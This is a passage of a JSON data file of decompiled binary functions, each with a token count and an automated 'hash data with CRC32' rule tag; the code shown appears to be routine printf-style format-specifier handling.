piVar1, uVar11);\n                iVar5 = var_14h;\n                param_1 = var_18h;\n                if (*piVar1 == -1) break;\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < iVar8);\n        }\n    }\n    piVar1 = param_1 + 0x14;\n    fcn.0045589c(&var_ch, iVar5, piVar1, *(param_1 + 8));\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && ((*(param_1 + 0x1c) >> 2 & 1) == 0)) {\n        var_18h = *(param_1 + 8);\n        var_10h = NULL;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(var_1ch, param_1 + 0x14, var_18h);\n                if (*(param_1 + 0x14) == -1) break;\n                var_10h = var_10h + 1;\n            } while (var_10h < iVar8);\n        }\n    }\n    iVar6 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar5 = *(param_1 + 8);\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        var_10h = *(param_1 + 0x30);\n        var_14h = 0;\n        bVar9 = *(param_1 + 0x34) == 0;\n        while (!bVar9) {\n            var_1ch = var_1ch & 0xffff0000;\n            var_18h = fcn.0045ee07(&var_1ch, var_10h, *(*(iVar5 + 0xc) + 4), *(param_1 + 8));\n            if (var_18h < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00454eb0(var_1ch, param_1 + 0x14, *(param_1 + 8));\n            var_10h = var_10h + var_18h;\n            var_14h = var_14h + 1;\n            bVar9 = var_14h == *(param_1 + 0x34);\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    if (((-1 < *(param_1 + 0x14)) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (var_18h = *(param_1 + 8),  0 < iVar8)) {\n        do {\n            fcn.00454eb0(0x20, piVar1, var_18h);\n            if (*piVar1 == -1) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar8);\n    }\ncode_r0x0044ecc5:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2376
    },
    "0044ecd4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044ecd4(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    int32_t iVar6;\n    ushort uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint16_t uVar10;\n    uint uVar11;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_10h = 0x41;\n    iVar6 = 0;\n    uVar10 = *(param_1 + 0x2e);\n    var_18h = param_1;\n    if (uVar10 < 0x65) {\n        if (uVar10 == 100) {\ncode_r0x0044ed97:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044ed9b:\n            cVar4 = fcn.0044289f(0);\n        }\n        else if (uVar10 < 0x54) {\n            if (uVar10 == 0x53) {\ncode_r0x0044edc4:\n                cVar4 = fcn.00453164();\n            }\n            else {\n                if (uVar10 != 0x41) {\n                    if (uVar10 == 0x43) {\ncode_r0x0044ed51:\n                        cVar4 = fcn.004520ce(0);\n                        goto code_r0x0044edd4;\n                    }\n                    if (((uVar10 != 0x45) && (uVar10 != 0x46)) && (uVar10 != 0x47)) goto code_r0x0044f032;\n                }\ncode_r0x0044ed30:\n                cVar4 = fcn.00451377();\n            }\n        }\n        else if (uVar10 == 0x58) {\n            uVar11 = 1;\ncode_r0x0044ed66:\n            cVar4 = fcn.00443b93(uVar11);\n        }\n        else {\n            if (uVar10 != 0x5a) {\n                if (uVar10 != 0x61) {\n                    if (uVar10 != 99) goto code_r0x0044f032;\n                    goto code_r0x0044ed51;\n                }\n                goto code_r0x0044ed30;\n            }\n            cVar4 = fcn.00450613();\n        }\n    }\n    else if (uVar10 < 0x70) {\n        if (uVar10 == 0x6f) {\n            cVar4 = fcn.00452c93();\n        }\n        else {\n            if (((uVar10 == 0x65) || (uVar10 == 0x66)) || (uVar10 == 0x67)) goto code_r0x0044ed30;\n            if (uVar10 == 0x69) goto code_r0x0044ed97;\n            if (uVar10 != 0x6e) goto code_r0x0044f032;\n            cVar4 = fcn.004528df();\n        }\n    }\n    else {\n        if (uVar10 != 0x70) {\n            if (uVar10 == 0x73) goto code_r0x0044edc4;\n            if (uVar10 != 0x75) {\n                if (uVar10 != 0x78) goto code_r0x0044f032;\n                uVar11 = 0;\n                goto code_r0x0044ed66;\n            }\n            goto code_r0x0044ed9b;\n        }\n        cVar4 = fcn.00452dbe();\n    }\ncode_r0x0044edd4:\n    if (((cVar4 == '\\0') || (cVar4 = fcn.0044ad58(),  cVar4 != '\\0')) || (*(param_1 + 0x2c) != '\\0'))\n    goto code_r0x0044f032;\n    var_ch = 0;\n    iVar5 = 0;\n    var_8h._0_2_ = 0;\n    var_14h = 0;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    iVar5 = 1;\n                    var_14h = 1;\n                }\n                goto code_r0x0044ee46;\n            }\n            uVar10 = 0x2b;\n        }\n        else {\n            uVar10 = 0x2d;\n        }\n        var_ch = uVar10;\n        var_14h = 1;\n        iVar5 = 1;\n    }\ncode_r0x0044ee46:\n    iVar2 = *(param_1 + 0x2e);\n    if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar9 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar9 = false;\n    }\n    if ((iVar2 == 0x61) || (bVar3 = false,  iVar2 == var_10h)) {\n        bVar3 = true;\n    }\n    var_1ch = 0x30;\n    if ((bVar9) || (bVar3)) {\n        *(&var_ch + iVar5 * 2) = 0x30;\n        if ((iVar2 == 0x58) || (uVar7 = 0x78,  iVar2 == var_10h)) {\n            uVar7 = 0x58;\n        }\n        *(&var_ch + iVar5 * 2 + 2) = uVar7;\n        iVar5 = iVar5 + 2;\n        var_14h = iVar5;\n    }\n    iVar8 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - iVar5;\n    if ((*(param_1 + 0x1c) & 0xc) == 0) {\n        uVar11 = *(param_1 + 8);\n        piVar1 = param_1 + 0x14;\n        var_10h = piVar1;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(0x20, piVar1, uVar11);\n                iVar5 = var_14h;\n                param_1 = var_18h;\n                if (*piVar1 == -1) break;\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < iVar8);\n        }\n    }\n    piVar1 = param_1 + 0x14;\n    fcn.0045589c(&var_ch, iVar5, piVar1, *(param_1 + 8));\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && ((*(param_1 + 0x1c) >> 2 & 1) == 0)) {\n        var_18h = *(param_1 + 8);\n        var_10h = NULL;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(var_1ch, param_1 + 0x14, var_18h);\n                if (*(param_1 + 0x14) == -1) break;\n                var_10h = var_10h + 1;\n            } while (var_10h < iVar8);\n        }\n    }\n    iVar6 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar5 = *(param_1 + 8);\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        var_10h = *(param_1 + 0x30);\n        var_14h = 0;\n        bVar9 = *(param_1 + 0x34) == 0;\n        while (!bVar9) {\n            var_1ch = var_1ch & 0xffff0000;\n            var_18h = fcn.0045ee07(&var_1ch, var_10h, *(*(iVar5 + 0xc) + 4), *(param_1 + 8));\n            if (var_18h < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00454eb0(var_1ch, param_1 + 0x14, *(param_1 + 8));\n            var_10h = var_10h + var_18h;\n            var_14h = var_14h + 1;\n            bVar9 = var_14h == *(param_1 + 0x34);\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    if (((-1 < *(param_1 + 0x14)) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (var_18h = *(param_1 + 8),  0 < iVar8)) {\n        do {\n            fcn.00454eb0(0x20, piVar1, var_18h);\n            if (*piVar1 == -1) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar8);\n    }\ncode_r0x0044f032:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2386
    },
    "0044f041": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f041(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint unaff_EBX;\n    int32_t iVar6;\n    ushort uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    uint16_t uVar10;\n    uint uVar11;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_10h = 0x41;\n    iVar6 = 0;\n    uVar10 = *(param_1 + 0x2e);\n    var_18h = param_1;\n    if (uVar10 < 0x65) {\n        if (uVar10 == 100) {\ncode_r0x0044f104:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044f108:\n            cVar4 = fcn.00442a3f(0);\n        }\n        else if (uVar10 < 0x54) {\n            if (uVar10 == 0x53) {\ncode_r0x0044f131:\n                cVar4 = fcn.004531e4();\n            }\n            else {\n                if (uVar10 != 0x41) {\n                    if (uVar10 == 0x43) {\ncode_r0x0044f0be:\n                        cVar4 = fcn.00452199(0);\n                        goto code_r0x0044f141;\n                    }\n                    if (((uVar10 != 0x45) && (uVar10 != 0x46)) && (uVar10 != 0x47)) goto code_r0x0044f390;\n                }\ncode_r0x0044f09d:\n                cVar4 = fcn.0045153b();\n            }\n        }\n        else if (uVar10 == 0x58) {\n            uVar11 = 1;\ncode_r0x0044f0d3:\n            cVar4 = fcn.00443d33(uVar11);\n        }\n        else {\n            if (uVar10 != 0x5a) {\n                if (uVar10 != 0x61) {\n                    if (uVar10 != 99) goto code_r0x0044f390;\n                    goto code_r0x0044f0be;\n                }\n                goto code_r0x0044f09d;\n            }\n            cVar4 = fcn.0045068d();\n        }\n    }\n    else if (uVar10 < 0x70) {\n        if (uVar10 == 0x6f) {\n            cVar4 = fcn.00452cb0();\n        }\n        else {\n            if (((uVar10 == 0x65) || (uVar10 == 0x66)) || (uVar10 == 0x67)) goto code_r0x0044f09d;\n            if (uVar10 == 0x69) goto code_r0x0044f104;\n            if (uVar10 != 0x6e) goto code_r0x0044f390;\n            cVar4 = fcn.0045298c();\n        }\n    }\n    else {\n        if (uVar10 != 0x70) {\n            if (uVar10 == 0x73) goto code_r0x0044f131;\n            if (uVar10 != 0x75) {\n                if (uVar10 != 0x78) goto code_r0x0044f390;\n                uVar11 = 0;\n                goto code_r0x0044f0d3;\n            }\n            goto code_r0x0044f108;\n        }\n        cVar4 = fcn.00452dd4();\n    }\ncode_r0x0044f141:\n    if ((cVar4 == '\\0') || (*(param_1 + 0x2c) != '\\0')) goto code_r0x0044f390;\n    var_ch = 0;\n    iVar5 = 0;\n    var_8h._0_2_ = 0;\n    var_14h = 0;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    iVar5 = 1;\n                    var_14h = 1;\n                }\n                goto code_r0x0044f1a4;\n            }\n            uVar10 = 0x2b;\n        }\n        else {\n            uVar10 = 0x2d;\n        }\n        var_ch = uVar10;\n        var_14h = 1;\n        iVar5 = 1;\n    }\ncode_r0x0044f1a4:\n    iVar2 = *(param_1 + 0x2e);\n    if (((iVar2 != 0x78) && (iVar2 != 0x58)) || (bVar9 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar9 = false;\n    }\n    if ((iVar2 == 0x61) || (bVar3 = false,  iVar2 == var_10h)) {\n        bVar3 = true;\n    }\n    var_1ch = 0x30;\n    if ((bVar9) || (bVar3)) {\n        *(&var_ch + iVar5 * 2) = 0x30;\n        if ((iVar2 == 0x58) || (uVar7 = 0x78,  iVar2 == var_10h)) {\n            uVar7 = 0x58;\n        }\n        *(&var_ch + iVar5 * 2 + 2) = uVar7;\n        iVar5 = iVar5 + 2;\n        var_14h = iVar5;\n    }\n    iVar8 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - iVar5;\n    if ((*(param_1 + 0x1c) & 0xc) == 0) {\n        uVar11 = *(param_1 + 8);\n        piVar1 = param_1 + 0x14;\n        var_10h = piVar1;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(0x20, piVar1, uVar11);\n                iVar5 = var_14h;\n                param_1 = var_18h;\n                if (*piVar1 == -1) break;\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < iVar8);\n        }\n    }\n    piVar1 = param_1 + 0x14;\n    fcn.0045589c(&var_ch, iVar5, piVar1, *(param_1 + 8));\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && ((*(param_1 + 0x1c) >> 2 & 1) == 0)) {\n        var_18h = *(param_1 + 8);\n        var_10h = NULL;\n        if (0 < iVar8) {\n            do {\n                fcn.00454eb0(var_1ch, param_1 + 0x14, var_18h);\n                if (*(param_1 + 0x14) == -1) break;\n                var_10h = var_10h + 1;\n            } while (var_10h < iVar8);\n        }\n    }\n    iVar6 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar5 = *(param_1 + 8);\n        if (*(iVar5 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        var_10h = *(param_1 + 0x30);\n        var_14h = 0;\n        bVar9 = *(param_1 + 0x34) == 0;\n        while (!bVar9) {\n            var_1ch = var_1ch & 0xffff0000;\n            var_18h = fcn.0045ee07(&var_1ch, var_10h, *(*(iVar5 + 0xc) + 4), *(param_1 + 8));\n            if (var_18h < 1) {\n                *(param_1 + 0x14) = 0xffffffff;\n                break;\n            }\n            fcn.00454eb0(var_1ch, param_1 + 0x14, *(param_1 + 8));\n            var_10h = var_10h + var_18h;\n            var_14h = var_14h + 1;\n            bVar9 = var_14h == *(param_1 + 0x34);\n        }\n    }\n    else {\n        fcn.0045589c(*(param_1 + 0x30), *(param_1 + 0x34), param_1 + 0x14, *(param_1 + 8));\n    }\n    if (((-1 < *(param_1 + 0x14)) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (var_18h = *(param_1 + 8),  0 < iVar8)) {\n        do {\n            fcn.00454eb0(0x20, piVar1, var_18h);\n            if (*piVar1 == -1) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar8);\n    }\ncode_r0x0044f390:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2378
    },
    "0044f39f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f39f(int32_t param_1)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint unaff_EBX;\n    int32_t iVar11;\n    ushort uVar12;\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044f45f:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044f463:\n            cVar6 = fcn.00442bd1(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044f48c:\n                cVar6 = fcn.00453258();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044f419:\n                        cVar6 = fcn.00452241(0);\n                        goto code_r0x0044f49c;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044f784;\n                }\ncode_r0x0044f3f8:\n                cVar6 = fcn.004516e2();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044f42e:\n            cVar6 = fcn.00443ec5(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044f784;\n                    goto code_r0x0044f419;\n                }\n                goto code_r0x0044f3f8;\n            }\n            cVar6 = fcn.004506f0();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar6 = fcn.00452ccd();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044f3f8;\n            if (uVar2 == 0x69) goto code_r0x0044f45f;\n            if (uVar2 != 0x6e) goto code_r0x0044f784;\n            cVar6 = fcn.00452a11();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044f48c;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044f784;\n                arg_8h = 0;\n                goto code_r0x0044f42e;\n            }\n            goto code_r0x0044f463;\n        }\n        cVar6 = fcn.00452dea();\n    }\ncode_r0x0044f49c:\n    if ((cVar6 == '\\0') || (*(param_1 + 0x2c) != '\\0')) goto code_r0x0044f784;\n    var_ch = 0;\n    piVar7 = NULL;\n    var_8h._0_2_ = 0;\n    var_10h = NULL;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    piVar7 = 0x1;\n                    var_10h = 0x1;\n                }\n                goto code_r0x0044f4ff;\n            }\n            uVar2 = 0x2b;\n        }\n        else {\n            uVar2 = 0x2d;\n        }\n        var_ch = uVar2;\n        var_10h = 0x1;\n        piVar7 = 0x1;\n    }\ncode_r0x0044f4ff:\n    iVar3 = *(param_1 + 0x2e);\n    if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar4 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((iVar3 == 0x61) || (bVar5 = false,  iVar3 == 0x41)) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&var_ch + piVar7 * 2) = 0x30;\n        if ((iVar3 == 0x58) || (uVar12 = 0x78,  iVar3 == 0x41)) {\n            uVar12 = 0x58;\n        }\n        *(&var_ch + piVar7 * 2 + 2) = uVar12;\n        piVar7 = piVar7 + 2;\n        var_10h = piVar7;\n    }\n    iVar10 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - piVar7;\n    if (((*(param_1 + 0x1c) & 0xc) == 0) && (0 < iVar10)) {\n        iVar11 = *(param_1 + 0x14);\n        iVar8 = 0;\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = iVar11 + 1;\n                }\n                *(param_1 + 0x14) = iVar11;\n            }\n            else {\n                *(param_1 + 0x14) = iVar11 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            iVar11 = *(param_1 + 0x14);\n            piVar7 = var_10h;\n        } while ((iVar11 != -1) && (iVar8 = iVar8 + 1,  iVar8 < iVar10));\n    }\n    arg_10h = param_1 + 0x14;\n    fcn.0045592f(&var_ch, piVar7, arg_10h);\n    ppiVar1 = param_1 + 0x448;\n    if (((*(param_1 + 0x1c) >> 3 & 1) != 0) && (((*(param_1 + 0x1c) >> 2 & 1) == 0 && (var_14h = 0,  0 < iVar10)))) {\n        do {\n            var_10h = *ppiVar1;\n            if (var_10h[2] == var_10h[1]) {\n                if (*(var_10h + 3) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = *arg_10h + 1;\n                }\n                *arg_10h = iVar11;\n            }\n            else {\n                *arg_10h = *arg_10h + 1;\n                var_10h[2] = var_10h[2] + 1;\n                ***ppiVar1 = 0x30;\n                **ppiVar1 = **ppiVar1 + 2;\n            }\n        } while ((*arg_10h != -1) && (var_14h = var_14h + 1,  var_14h < iVar10));\n    }\n    iVar11 = 0;\n    if ((*(param_1 + 0x38) == '\\0') && (0 < *(param_1 + 0x34))) {\n        iVar8 = *(param_1 + 8);\n        if (*(iVar8 + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        iVar9 = *(param_1 + 0x30);\n        var_14h = 0;\n        if (*(param_1 + 0x34) != 0) {\n            do {\n                var_10h = var_10h & 0xffff0000;\n                var_ch = fcn.0045ee07(&var_10h, iVar9, *(*(iVar8 + 0xc) + 4), *(param_1 + 8));\n                ppiVar1 = param_1 + 0x448;\n                if (var_ch < 1) {\n                    *arg_10h = -1;\n                    break;\n                }\n                piVar7 = *ppiVar1;\n                if (piVar7[2] == piVar7[1]) {\n                    if (*(piVar7 + 3) == '\\0') {\n                        *arg_10h = -1;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 1;\n                    }\n                }\n                else {\n                    *arg_10h = *arg_10h + 1;\n                    piVar7[2] = piVar7[2] + 1;\n                    ***ppiVar1 = var_10h;\n                    **ppiVar1 = **ppiVar1 + 2;\n                }\n                iVar9 = iVar9 + var_ch;\n                var_14h = var_14h + 1;\n            } while (var_14h != *(param_1 + 0x34));\n        }\n    }\n    else {\n        fcn.0045592f(*(param_1 + 0x30), *(param_1 + 0x34), arg_10h);\n    }\n    iVar8 = *arg_10h;\n    if (((-1 < iVar8) && ((*(param_1 + 0x1c) >> 2 & 1) != 0)) && (0 < iVar10)) {\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar8 = -1;\n                }\n                else {\n                    iVar8 = iVar8 + 1;\n                }\n                *arg_10h = iVar8;\n            }\n            else {\n                *arg_10h = iVar8 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                piVar7 = *(param_1 + 0x448);\n                *piVar7 = *piVar7 + 2;\n            }\n            iVar8 = *arg_10h;\n        } while ((iVar8 != -1) && (iVar11 = iVar11 + 1,  iVar11 < iVar10));\n    }\ncode_r0x0044f784:\n    fcn.004303e9(unaff_EBX);\n    return;\n}\n",
        "token_count": 2852
    },
    "0044f793": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f793(int32_t param_1)\n\n{\n    int32_t *arg_10h;\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    int16_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    char cVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint unaff_EBX;\n    int32_t iVar11;\n    ushort uVar12;\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar2 = *(param_1 + 0x2e);\n    if (uVar2 < 0x65) {\n        if (uVar2 == 100) {\ncode_r0x0044f853:\n            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x10;\ncode_r0x0044f857:\n            cVar6 = fcn.00442d63(0);\n        }\n        else if (uVar2 < 0x54) {\n            if (uVar2 == 0x53) {\ncode_r0x0044f880:\n                cVar6 = fcn.004532cc();\n            }\n            else {\n                if (uVar2 != 0x41) {\n                    if (uVar2 == 0x43) {\ncode_r0x0044f80d:\n                        cVar6 = fcn.004522e9(0);\n                        goto code_r0x0044f890;\n                    }\n                    if (((uVar2 != 0x45) && (uVar2 != 0x46)) && (uVar2 != 0x47)) goto code_r0x0044fb87;\n                }\ncode_r0x0044f7ec:\n                cVar6 = fcn.00451889();\n            }\n        }\n        else if (uVar2 == 0x58) {\n            arg_8h = 1;\ncode_r0x0044f822:\n            cVar6 = fcn.00444057(arg_8h);\n        }\n        else {\n            if (uVar2 != 0x5a) {\n                if (uVar2 != 0x61) {\n                    if (uVar2 != 99) goto code_r0x0044fb87;\n                    goto code_r0x0044f80d;\n                }\n                goto code_r0x0044f7ec;\n            }\n            cVar6 = fcn.00450753();\n        }\n    }\n    else if (uVar2 < 0x70) {\n        if (uVar2 == 0x6f) {\n            cVar6 = fcn.00452cea();\n        }\n        else {\n            if (((uVar2 == 0x65) || (uVar2 == 0x66)) || (uVar2 == 0x67)) goto code_r0x0044f7ec;\n            if (uVar2 == 0x69) goto code_r0x0044f853;\n            if (uVar2 != 0x6e) goto code_r0x0044fb87;\n            cVar6 = fcn.00452a96();\n        }\n    }\n    else {\n        if (uVar2 != 0x70) {\n            if (uVar2 == 0x73) goto code_r0x0044f880;\n            if (uVar2 != 0x75) {\n                if (uVar2 != 0x78) goto code_r0x0044fb87;\n                arg_8h = 0;\n                goto code_r0x0044f822;\n            }\n            goto code_r0x0044f857;\n        }\n        cVar6 = fcn.00452e00();\n    }\ncode_r0x0044f890:\n    if (((cVar6 == '\\0') || (cVar6 = fcn.0044ad6f(),  cVar6 != '\\0')) || (*(param_1 + 0x2c) != '\\0'))\n    goto code_r0x0044fb87;\n    var_ch = 0;\n    piVar7 = NULL;\n    var_8h._0_2_ = 0;\n    var_10h = NULL;\n    if ((*(param_1 + 0x1c) >> 4 & 1) != 0) {\n        if ((*(param_1 + 0x1c) >> 6 & 1) == 0) {\n            if ((*(param_1 + 0x1c) & 1) == 0) {\n                if ((*(param_1 + 0x1c) >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    piVar7 = 0x1;\n                    var_10h = 0x1;\n                }\n                goto code_r0x0044f902;\n            }\n            uVar2 = 0x2b;\n        }\n        else {\n            uVar2 = 0x2d;\n        }\n        var_ch = uVar2;\n        var_10h = 0x1;\n        piVar7 = 0x1;\n    }\ncode_r0x0044f902:\n    iVar3 = *(param_1 + 0x2e);\n    if (((iVar3 != 0x78) && (iVar3 != 0x58)) || (bVar4 = true,  (*(param_1 + 0x1c) >> 5 & 1) == 0)) {\n        bVar4 = false;\n    }\n    if ((iVar3 == 0x61) || (bVar5 = false,  iVar3 == 0x41)) {\n        bVar5 = true;\n    }\n    if ((bVar4) || (bVar5)) {\n        *(&var_ch + piVar7 * 2) = 0x30;\n        if ((iVar3 == 0x58) || (uVar12 = 0x78,  iVar3 == 0x41)) {\n            uVar12 = 0x58;\n        }\n        *(&var_ch + piVar7 * 2 + 2) = uVar12;\n        piVar7 = piVar7 + 2;\n        var_10h = piVar7;\n    }\n    iVar10 = (*(param_1 + 0x20) - *(param_1 + 0x34)) - piVar7;\n    if (((*(param_1 + 0x1c) & 0xc) == 0) && (0 < iVar10)) {\n        iVar11 = *(param_1 + 0x14);\n        iVar8 = 0;\n        do {\n            iVar9 = *(param_1 + 0x448);\n            if (*(iVar9 + 8) == *(iVar9 + 4)) {\n                if (*(iVar9 + 0xc) == '\\0') {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = iVar11 + 1;\n                }\n                *(param_1 + 0x14) = iVar11;\n            }\n            else {\n                *(param_1 + 0x14) = iVar11 + 1;\n                *(iVar9 + 8) = *(iVar9 + 8) + 1;\n                ***(param_1 + 0x448) = 0x20;\n                **(param_1 + 0x448) = **(param_1 + 0x448) + 2;\n            }\n            iVar11 = *(param_1 + 0x14);\n            piVar7 = var_10h;\n        } while ((iVar11 != -1) && (iVar8 = iVar8 + 1,  iVar8 < iVar10));\n    }\n    arg_10h = param_1 + 